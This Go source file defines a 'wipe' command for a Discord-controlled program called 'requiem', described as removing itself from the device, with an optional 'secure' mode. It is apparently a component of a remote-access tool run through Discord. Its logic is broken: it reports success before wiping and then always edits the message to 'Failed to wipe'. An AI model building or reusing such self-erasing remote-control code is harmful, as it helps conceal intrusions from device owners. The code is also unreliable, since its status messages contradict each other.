package commands

import (
	"strings"

	"requiem/funcs"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*WipeCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully wiped.", msg.Reference())

	content := strings.Join(args, " ")
	secure := utils.HasFlag(content, "secure")

	funcs.Wipe(secure)

	ses.ChannelMessageEdit(msg.ChannelID, initial.ID, "🟥 Failed to wipe.")
}

func (*WipeCommand) Name() string {
	return "wipe"
}

func (*WipeCommand) Info() string {
	return "Removes requiem from the device."
}

type WipeCommand struct{}
